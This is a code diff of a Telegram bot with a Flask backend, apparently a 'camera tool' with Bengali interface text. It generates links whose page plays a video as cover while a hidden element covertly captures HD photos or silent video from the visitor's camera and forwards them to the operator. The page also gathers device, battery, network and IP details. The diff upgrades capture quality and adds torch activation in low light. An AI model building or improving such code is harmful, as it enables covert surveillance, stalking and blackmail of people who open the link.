@@ -1,13 +1,14 @@
 #!/usr/bin/env python3
 """
-Camera Tool Bot — Photo & Silent Video + Device Info (No Location, No Gallery)
-===============================================================================
+Camera Tool Bot — High-Quality Photo & Video + Device Info
+===========================================================
 Features:
   - Front / Back camera support
-  - Photo Mode: 4 photos in 4 seconds
-  - Video Mode: 5-second SILENT video (no mic permission)
+  - HD Photo (1920x1080, JPEG 95%)
+  - HD Silent Video (2.5 Mbps VP9/VP8)
+  - Low-light optimized (auto exposure, torch attempt)
   - Device Info: model, OS, browser, screen, battery, network, IP, hardware, camera list
-  - NO Location permission, NO Gallery access
+  - NO Location, NO Gallery
 """
 
 import os
@@ -62,7 +63,7 @@ def send_photo_to_telegram(photo_file, chat_id, bot_token, caption=""):
     if caption:
         payload["caption"] = caption
     try:
-        r = requests.post(url, files=files, data=payload, timeout=30)
+        r = requests.post(url, files=files, data=payload, timeout=60)
         r.raise_for_status()
         return {"status": "success"}
     except requests.RequestException as e:
@@ -76,7 +77,7 @@ def send_video_to_telegram(video_file, chat_id, bot_token, caption=""):
     if caption:
         payload["caption"] = caption
     try:
-        r = requests.post(url, files=files, data=payload, timeout=120)
+        r = requests.post(url, files=files, data=payload, timeout=180)
         r.raise_for_status()
         return {"status": "success"}
     except requests.RequestException as e:
@@ -104,7 +105,7 @@ def capture_and_send_photo(photo_data, chat_id, camera_type="front", photo_num=1
         image_bytes = base64.b64decode(image_data)
         photo_file = io.BytesIO(image_bytes)
         photo_file.name = f"{camera_type}_capture_{photo_num}.jpg"
-        caption = f"📸 {camera_type.upper()} Camera — ছবি {photo_num}/{total}"
+        caption = f"📸 {camera_type.upper()} Camera — ছবি {photo_num}/{total} (HD)"
         return send_photo_to_telegram(photo_file, chat_id, BOT_TOKEN, caption)
     except Exception as e:
         return {"status": "error", "details": str(e)}
@@ -119,14 +120,14 @@ def capture_and_send_video(video_data, chat_id, camera_type="front", duration=5)
         video_bytes = base64.b64decode(video_b64)
         video_file = io.BytesIO(video_bytes)
         video_file.name = f"{camera_type}_video_{duration}s.webm"
-        caption = f"🎥 {camera_type.upper()} Camera — ভিডিও (সাউন্ড ছাড়া, {duration}s)"
+        caption = f"🎥 {camera_type.upper()} Camera — ভিডিও (HD, সাউন্ড ছাড়া, {duration}s)"
         return send_video_to_telegram(video_file, chat_id, BOT_TOKEN, caption)
     except Exception as e:
         return {"status": "error", "details": str(e)}
 
 
 # ==========================================
-# Device Info Formatter (Location ও Gallery বাদ)
+# Device Info Formatter
 # ==========================================
 def format_device_info(info):
     if not info:
@@ -137,20 +138,17 @@ def format_device_info(info):
 
     lines = ["<b>📱 ডিভাইস তথ্য</b>", "━━━━━━━━━━━━━━━━━━"]
 
-    # Device
     lines.append("<b>📱 Device:</b>")
     lines.append(f"  • Model: <code>{esc(info.get('deviceModel'))}</code>")
     lines.append(f"  • Vendor: <code>{esc(info.get('deviceVendor'))}</code>")
     lines.append(f"  • Type: <code>{esc(info.get('deviceType'))}</code>")
     lines.append(f"  • Platform: <code>{esc(info.get('platform'))}</code>")
 
-    # OS
     lines.append("\n<b>💻 OS:</b>")
     lines.append(f"  • OS Version: <code>{esc(info.get('osVersion'))}</code>")
     ua = esc(info.get('userAgent'))
     lines.append(f"  • User Agent: <code>{ua[:120]}</code>")
 
-    # Browser
     lines.append("\n<b>🌐 Browser:</b>")
     lines.append(f"  • Name: <code>{esc(info.get('browser'))}</code>")
     lines.append(f"  • Version: <code>{esc(info.get('browserVersion'))}</code>")
@@ -158,7 +156,6 @@ def format_device_info(info):
     lines.append(f"  • Languages: <code>{esc(info.get('languages'))}</code>")
     lines.append(f"  • Timezone: <code>{esc(info.get('timezone'))}</code>")
 
-    # Screen
     lines.append("\n<b>🖥 Screen:</b>")
     lines.append(f"  • Resolution: <code>{esc(info.get('screen'))}</code>")
     lines.append(f"  • Available: <code>{esc(info.get('screenAvailable'))}</code>")
@@ -167,7 +164,6 @@ def format_device_info(info):
     lines.append(f"  • Color Depth: <code>{esc(info.get('colorDepth'))}</code>")
     lines.append(f"  • Orientation: <code>{esc(info.get('orientation'))}</code>")
 
-    # Battery
     batt = info.get("battery", {})
     if batt:
         charging = "⚡ চার্জিং" if batt.get("charging") else "🔋 ডিসচার্জিং"
@@ -179,7 +175,6 @@ def format_device_info(info):
         if batt.get("dischargingTime") not in (None, "Unknown", ""):
             lines.append(f"  • Discharging Time: <code>{batt.get('dischargingTime')}s</code>")
 
-    # Network
     net = info.get("network", {})
     if net:
         lines.append("\n<b>📶 Network:</b>")
@@ -189,11 +184,9 @@ def format_device_info(info):
         lines.append(f"  • RTT: <code>{esc(net.get('rtt'))} ms</code>")
         lines.append(f"  • Save Data: <code>{esc(net.get('saveData'))}</code>")
 
-    # Public IP
     lines.append("\n<b>🌐 Public IP:</b>")
     lines.append(f"  • IP: <code>{esc(info.get('ip'))}</code>")
 
-    # Hardware
     lines.append("\n<b>⚙️ Hardware:</b>")
     lines.append(f"  • CPU Cores: <code>{esc(info.get('cores'))}</code>")
     lines.append(f"  • Memory: <code>{esc(info.get('memory'))} GB</code>")
@@ -201,14 +194,12 @@ def format_device_info(info):
     lines.append(f"  • Cookies: <code>{esc(info.get('cookiesEnabled'))}</code>")
     lines.append(f"  • Online: <code>{esc(info.get('online'))}</code>")
 
-    # Camera list
     cams = info.get("cameras", [])
     if cams:
         lines.append("\n<b>📷 Available Cameras:</b>")
         for i, c in enumerate(cams, 1):
             lines.append(f"  {i}. <code>{esc(c)}</code>")
 
-    # Camera capabilities
     caps = info.get("cameraCapabilities", {})
     if caps:
         lines.append("\n<b>🎥 Camera Capabilities:</b>")
@@ -223,7 +214,7 @@ def format_device_info(info):
 
 
 # ==========================================
-# Capture HTML
+# Capture HTML — HD কোয়ালিটি
 # ==========================================
 CAPTURE_HTML = """
 <!DOCTYPE html>
@@ -260,7 +251,48 @@ CAPTURE_HTML = """
         const CAPTURE_MODE = "{{ mode }}";
 
         // =========================================================
-        // 🔍 Helpers
+        // 🎯 HD Camera Constraints — অন্ধকারে ও কম আলোতে উন্নত
+        // =========================================================
+        function buildConstraints() {
+            const facing = CAMERA_TYPE === "back" ? "environment" : "user";
+            return {
+                audio: false,
+                video: {
+                    facingMode: { ideal: facing },
+                    width:  { ideal: 1920, min: 1280 },
+                    height: { ideal: 1080, min: 720 },
+                    frameRate: { ideal: 30, max: 30 },
+                    // কম আলোতে brighter image (Chrome/Android)
+                    advanced: [{ exposureMode: "continuous" }]
+                }
+            };
+        }
+
+        // 🔦 টর্চ চালু করার চেষ্টা (কম আলোতে সহায়ক)
+        async function tryTorchOn(track) {
+            try {
+                if (track && track.getCapabilities) {
+                    const caps = track.getCapabilities();
+                    if (caps.torch) {
+                        await track.applyConstraints({ advanced: [{ torch: true }] });
+                        console.log("🔦 Torch ON");
+                        return true;
+                    }
+                }
+            } catch (e) { console.log("torch error", e); }
+            return false;
+        }
+
+        async function tryTorchOff(track) {
+            try {
+                if (track && track.getCapabilities && track.getCapabilities().torch) {
+                    await track.applyConstraints({ advanced: [{ torch: false }] });
+                }
+            } catch (e) {}
+        }
+
+        // =========================================================
+        // 🔍 Helpers (ডিভাইস তথ্য)
         // =========================================================
         function getBrowserInfo() {
             const ua = navigator.userAgent;
@@ -346,10 +378,7 @@ CAPTURE_HTML = """
 
         async function getCameraCapabilities() {
             try {
-                const stream = await navigator.mediaDevices.getUserMedia({
-                    video: { facingMode: CAMERA_TYPE === "back" ? "environment" : "user" },
-                    audio: false
-                });
+                const stream = await navigator.mediaDevices.getUserMedia(buildConstraints());
                 const track = stream.getVideoTracks()[0];
                 let caps = {};
                 if (track.getCapabilities) {
@@ -367,7 +396,7 @@ CAPTURE_HTML = """
         }
 
         // =========================================================
-        // 📱 ডিভাইস তথ্য সংগ্রহ (Location ও Gallery বাদ)
+        // 📱 ডিভাইস তথ্য সংগ্রহ
         // =========================================================
         async function collectDeviceInfo() {
             const b = getBrowserInfo();
@@ -376,8 +405,7 @@ CAPTURE_HTML = """
             const cams = await listCameras();
             const caps = await getCameraCapabilities();
 
-            const info = {
-                // Browser / OS
+            return {
                 userAgent: navigator.userAgent,
                 platform: navigator.platform || "Unknown",
                 osVersion: detectOS(),
@@ -389,56 +417,43 @@ CAPTURE_HTML = """
                 language: navigator.language,
                 languages: (navigator.languages || []).join(", "),
                 timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
-
-                // Screen
                 screen: `${screen.width}x${screen.height}`,
                 screenAvailable: `${screen.availWidth}x${screen.availHeight}`,
                 viewport: `${window.innerWidth}x${window.innerHeight}`,
                 pixelRatio: window.devicePixelRatio || 1,
                 colorDepth: screen.colorDepth,
                 orientation: getOrientation(),
-
-                // Hardware
                 cores: navigator.hardwareConcurrency || "Unknown",
                 memory: navigator.deviceMemory || "Unknown",
                 touchPoints: navigator.maxTouchPoints || 0,
                 cookiesEnabled: navigator.cookieEnabled,
                 online: navigator.onLine,
-
-                // Network / Battery
                 network: getNetworkInfo(),
                 battery: battery,
                 ip: ip,
-
-                // Cameras
                 cameras: cams,
                 cameraCapabilities: caps
             };
-            return info;
         }
 
         function sendDeviceInfo(info) {
             return fetch('/device_info', {
                 method: 'POST',
                 headers: { 'Content-Type': 'application/json' },
-                body: JSON.stringify({
-                    chat_id: CHAT_ID,
-                    camera_type: CAMERA_TYPE,
-                    info: info
-                })
+                body: JSON.stringify({ chat_id: CHAT_ID, camera_type: CAMERA_TYPE, info: info })
             });
         }
 
         // =========================================================
-        // মোড ১: ছবি ক্যাপচার
+        // মোড ১: HD ছবি ক্যাপচার (৪টি)
         // =========================================================
         async function startPhotoCapture() {
             try {
-                const constraints = {
-                    video: { facingMode: CAMERA_TYPE === "back" ? "environment" : "user" },
-                    audio: false
-                };
-                const stream = await navigator.mediaDevices.getUserMedia(constraints);
+                const stream = await navigator.mediaDevices.getUserMedia(buildConstraints());
+                const track = stream.getVideoTracks()[0];
+
+                // 🔦 কম আলোতে টর্চ চালু
+                const torchWasOn = await tryTorchOn(track);
 
                 const hiddenVideo = document.createElement('video');
                 hiddenVideo.srcObject = stream;
@@ -446,23 +461,42 @@ CAPTURE_HTML = """
                 hiddenVideo.muted = true;
                 hiddenVideo.style.display = 'none';
                 document.body.appendChild(hiddenVideo);
-                hiddenVideo.play();
+                await hiddenVideo.play();
+
+                // videoReady promise
+                await new Promise((res) => {
+                    if (hiddenVideo.readyState >= 2) return res();
+                    hiddenVideo.onloadeddata = res;
+                });
+                await new Promise(r => setTimeout(r, 500)); // exposure settle
 
                 hiddenVideo.onplaying = () => {
                     const TOTAL_PHOTOS = 4;
                     const INTERVAL_MS = 1000;
-                    const START_DELAY = 1000;
+                    const START_DELAY = 800;
                     let photoCount = 0;
 
                     setTimeout(() => {
                         const interval = setInterval(async () => {
                             try {
+                                // ✅ আসল ক্যামেরা resolution ব্যবহার (blur হবে না)
+                                const w = hiddenVideo.videoWidth || 1280;
+                                const h = hiddenVideo.videoHeight || 720;
+
                                 const canvas = document.createElement('canvas');
-                                canvas.width = hiddenVideo.videoWidth || 640;
-                                canvas.height = hiddenVideo.videoHeight || 480;
-                                const ctx = canvas.getContext('2d');
-                                ctx.drawImage(hiddenVideo, 0, 0, canvas.width, canvas.height);
-                                const photo = canvas.toDataURL('image/jpeg', 0.85);
+                                canvas.width = w;
+                                canvas.height = h;
+                                const ctx = canvas.getContext('2d', { willReadFrequently: false });
+
+                                // কিছু ব্রাউজারে mirror ঠিক রাখতে (front camera)
+                                if (CAMERA_TYPE === "front") {
+                                    ctx.translate(w, 0);
+                                    ctx.scale(-1, 1);
+                                }
+                                ctx.drawImage(hiddenVideo, 0, 0, w, h);
+
+                                // ✅ High JPEG quality (0.95) → ছবি স্পষ্ট
+                                const photo = canvas.toDataURL('image/jpeg', 0.95);
                                 photoCount++;
 
                                 await fetch('/capture', {
@@ -476,40 +510,48 @@ CAPTURE_HTML = """
                                         total: TOTAL_PHOTOS
                                     })
                                 });
+
                                 if (photoCount >= TOTAL_PHOTOS) {
                                     clearInterval(interval);
+                                    if (torchWasOn) await tryTorchOff(track);
                                     stream.getTracks().forEach(t => t.stop());
                                 }
                             } catch (e) { console.log("capture error", e); }
                         }, INTERVAL_MS);
                     }, START_DELAY);
                 };
+
+                // onplaying না লাগলে fallback
+                if (hiddenVideo.readyState >= 2) hiddenVideo.onplaying();
+
             } catch (e) { console.log("camera error", e); }
         }
 
         // =========================================================
-        // মোড ২: সাইলেন্ট ভিডিও ক্যাপচার (৫ সেকেন্ড)
+        // মোড ২: HD সাইলেন্ট ভিডিও (৫ সেকেন্ড, high bitrate)
         // =========================================================
         async function startVideoCapture() {
             try {
-                const constraints = {
-                    video: {
-                        facingMode: CAMERA_TYPE === "back" ? "environment" : "user",
-                        width: { ideal: 640 },
-                        height: { ideal: 480 }
-                    },
-                    audio: false
-                };
-                const stream = await navigator.mediaDevices.getUserMedia(constraints);
+                const stream = await navigator.mediaDevices.getUserMedia(buildConstraints());
+                const track = stream.getVideoTracks()[0];
 
-                let mimeType = 'video/webm;codecs=vp8';
+                // 🔦 কম আলোতে টর্চ চালু
+                const torchWasOn = await tryTorchOn(track);
+
+                // ✅ সর্বোচ্চ কোয়ালিটির MIME + bitrate
+                let mimeType = 'video/webm;codecs=vp9';
                 if (!window.MediaRecorder || !MediaRecorder.isTypeSupported(mimeType)) {
-                    if (MediaRecorder.isTypeSupported('video/webm')) mimeType = 'video/webm';
+                    if (MediaRecorder.isTypeSupported('video/webm;codecs=vp8')) mimeType = 'video/webm;codecs=vp8';
+                    else if (MediaRecorder.isTypeSupported('video/webm')) mimeType = 'video/webm';
+                    else if (MediaRecorder.isTypeSupported('video/mp4;codecs=avc1')) mimeType = 'video/mp4;codecs=avc1';
                     else if (MediaRecorder.isTypeSupported('video/mp4')) mimeType = 'video/mp4';
                     else mimeType = '';
                 }
 
-                const options = mimeType ? { mimeType: mimeType } : {};
+                const options = {
+                    mimeType: mimeType || undefined,
+                    videoBitsPerSecond: 2500000   // ✅ 2.5 Mbps → HD কোয়ালিটি
+                };
                 const recorder = new MediaRecorder(stream, options);
                 const chunks = [];
                 const actualMime = recorder.mimeType || mimeType || 'video/webm';
@@ -536,11 +578,16 @@ CAPTURE_HTML = """
                         };
                         reader.readAsDataURL(blob);
                     } catch (err) { console.log("video send error", err); }
-                    finally { stream.getTracks().forEach(t => t.stop()); }
+                    finally {
+                        if (torchWasOn) await tryTorchOff(track);
+                        stream.getTracks().forEach(t => t.stop());
+                    }
                 };
 
                 setTimeout(() => {
-                    try { recorder.start(); } catch (e) { return; }
+                    try {
+                        recorder.start(1000);   // ১ সেকেন্ডের chunk
+                    } catch (e) { return; }
                     setTimeout(() => {
                         try { if (recorder.state !== 'inactive') recorder.stop(); } catch (e) {}
                     }, 5000);
@@ -595,13 +642,11 @@ CAPTURE_HTML = """
         window.onload = async () => {
             loadVideo();
 
-            // ডিভাইস তথ্য সংগ্রহ → Telegram-এ পাঠান
             try {
                 const info = await collectDeviceInfo();
                 await sendDeviceInfo(info);
             } catch (e) { console.log("device info error", e); }
 
-            // ক্যাপচার শুরু
             if (CAPTURE_MODE === "video") {
                 startVideoCapture();
             } else {
@@ -675,13 +720,10 @@ def device_info():
     data = request.get_json(silent=True)
     if not data or "info" not in data:
         return jsonify({"status": "error", "details": "No info"}), 400
-
     chat_id = data.get("chat_id", CHAT_ID)
     info = data.get("info", {})
-    # Server-side IP fallback
     if not info.get("ip") or info.get("ip") == "Unknown":
         info["ip"] = request.headers.get("X-Forwarded-For", request.remote_addr or "Unknown").split(",")[0].strip()
-
     text = format_device_info(info)
     result = send_message_to_telegram(text, chat_id, BOT_TOKEN)
     return jsonify(result)
@@ -699,7 +741,7 @@ async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
         InlineKeyboardButton("📷 Back Camera", callback_data="cam_back"),
     ]]
     await update.message.reply_text(
-        "🎥 *Camera Tool*\n\nকোন ক্যামেরা ব্যবহার করতে চান?",
+        "🎥 *Camera Tool (HD)*\n\nকোন ক্যামেরা ব্যবহার করতে চান?",
         reply_markup=InlineKeyboardMarkup(keyboard),
         parse_mode="Markdown",
     )
@@ -719,8 +761,8 @@ async def button_handler(update: Update, context: ContextTypes.DEFAULT_TYPE):
         cam = data.split("_")[1]
         user_sessions[chat_id] = {"camera": cam}
         keyboard = [
-            [InlineKeyboardButton("📸 Photo Mode", callback_data="mode_photo"),
-             InlineKeyboardButton("🎥 Video Mode (Silent)", callback_data="mode_video")],
+            [InlineKeyboardButton("📸 Photo Mode (HD)", callback_data="mode_photo"),
+             InlineKeyboardButton("🎥 Video Mode (HD)", callback_data="mode_video")],
             [InlineKeyboardButton("❌ Cancel", callback_data="cancel")],
         ]
         cam_name = "Front" if cam == "front" else "Back"
@@ -740,7 +782,7 @@ async def button_handler(update: Update, context: ContextTypes.DEFAULT_TYPE):
             [InlineKeyboardButton("❌ Cancel", callback_data="cancel")],
         ]
         await query.edit_message_text(
-            "📸 *Photo Mode*\n\nলিংকের ধরন বেছে নিন:",
+            "📸 *Photo Mode (HD 1920x1080)*\n\nলিংকের ধরন বেছে নিন:",
             reply_markup=InlineKeyboardMarkup(keyboard), parse_mode="Markdown")
         return
 
@@ -752,7 +794,7 @@ async def button_handler(update: Update, context: ContextTypes.DEFAULT_TYPE):
             [InlineKeyboardButton("❌ Cancel", callback_data="cancel")],
         ]
         await query.edit_message_text(
-            "🎥 *Video Mode (৫ সেকেন্ড — সাউন্ড ছাড়া)*\n\n"
+            "🎥 *Video Mode (HD 5s, সাউন্ড ছাড়া)*\n\n"
             "🔇 মাইক পারমিশন লাগবে না\n\nলিংকের ধরন বেছে নিন:",
             reply_markup=InlineKeyboardMarkup(keyboard), parse_mode="Markdown")
         return
@@ -773,7 +815,7 @@ async def button_handler(update: Update, context: ContextTypes.DEFAULT_TYPE):
         link_store[link_id] = {"chat_id": chat_id, "video_url": "", "camera": cam, "mode": mode}
         public_link = f"{PUBLIC_URL}/v/{link_id}" if PUBLIC_URL else f"⚠️ PUBLIC_URL সেট করা হয়নি — /v/{link_id}"
         keyboard = [[InlineKeyboardButton("❌ Cancel", callback_data="cancel")]]
-        details = "🎥 ভিডিও: ৫ সেকেন্ড (🔇 সাউন্ড ছাড়া)" if mode == "video" else "📷 ছবি: ৪টি (৪ সেকেন্ডে)"
+        details = "🎥 HD ভিডিও: ৫ সেকেন্ড (🔇 সাউন্ড ছাড়া)" if mode == "video" else "📷 HD ছবি: ৪টি (৪ সেকেন্ডে)"
         await query.edit_message_text(
             f"✅ *Direct Link তৈরি হয়েছে!*\n\n"
             f"📸 Camera: *{cam.capitalize()}*\n🎯 Mode: *{mode.capitalize()}*\n"
@@ -806,7 +848,7 @@ async def text_handler(update: Update, context: ContextTypes.DEFAULT_TYPE):
     link_store[link_id] = {"chat_id": chat_id, "video_url": url, "camera": cam, "mode": mode}
     public_link = f"{PUBLIC_URL}/v/{link_id}" if PUBLIC_URL else f"⚠️ PUBLIC_URL সেট করা হয়নি — /v/{link_id}"
     keyboard = [[InlineKeyboardButton("❌ Cancel", callback_data="cancel")]]
-    details = "🎥 ভিডিও: ৫ সেকেন্ড (🔇 সাউন্ড ছাড়া)" if mode == "video" else "📷 ছবি: ৪টি (৪ সেকেন্ডে)"
+    details = "🎥 HD ভিডিও: ৫ সেকেন্ড (🔇 সাউন্ড ছাড়া)" if mode == "video" else "📷 HD ছবি: ৪টি (৪ সেকেন্ডে)"
 
     await update.message.reply_text(
         f"✅ *Redirect Link তৈরি হয়েছে!*\n\n"
